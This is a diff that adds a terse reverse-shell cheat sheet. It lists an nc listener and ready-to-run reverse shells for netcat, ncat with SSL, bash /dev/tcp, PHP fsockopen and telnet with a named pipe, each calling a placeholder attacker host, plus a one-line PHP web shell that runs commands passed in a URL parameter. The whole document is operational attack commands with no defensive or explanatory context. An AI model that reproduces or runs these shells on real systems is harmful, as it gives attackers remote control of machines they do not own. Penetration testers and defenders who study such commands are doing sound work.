@@ -1,0 +1,34 @@
+REVERSE SHELL COMMANDS
+
+Listener - first run this on attacker machine
+nc -lnvp PORTNUM
+
+	
+Reverse Shell - to be run on remote machine when listener is up on attacker machine
+nc attacker.machine.ip.addr PORTNUM -e /bin/sh	Unix Machines
+nc attacker.machine.ip.addr PORTNUM -e cmd.exe	Windows machines
+
+
+NCAT (is slightly different than NC) allows SSL
+ncat -lvp PORTNUM --ssl	run on LOCAL
+ncat -e /bin/sh -v attacker.machine.ip.addr PORTNUM --ssl	run on REMOTE
+
+Bash-Only Rev Shell:
+bash -i >& /dev/tcp/attacker.machine.ip.addr/PORTNUM 0>&1
+
+or
+
+exec 5<>/dev/tcp/attacker.machine.ip.addr/PORTNUM
+cat <&5 | while read line; do $line 2>&5 >&5; done
+
+PHP System Rev Shell:
+php -r '$sock=fsockopen("attacker.machine.ip.addr","PORTNUM");exec("/bin/sh -i <&3 >&3 2>&3");'
+
+PHP URL Command Shell:
+<?php passthru($_GET["cmd"]); ?>	works when url user '?page=', use '?page=PAGENAME&cmd=COMMANDS'
+
+Telnet Reverse Shell:
+rm -f /tmp/p; mknod /tmp/p p && telnet attacker.machine.ip.addr PORTNUM 0/tmp/p
+or
+telnet attacker.machine.ip.addr PORTNUM_A | /bin/bash | telnet local.machine.ip.addr PORTNUM_B   # Remember to listen on PORTNUM_B
+
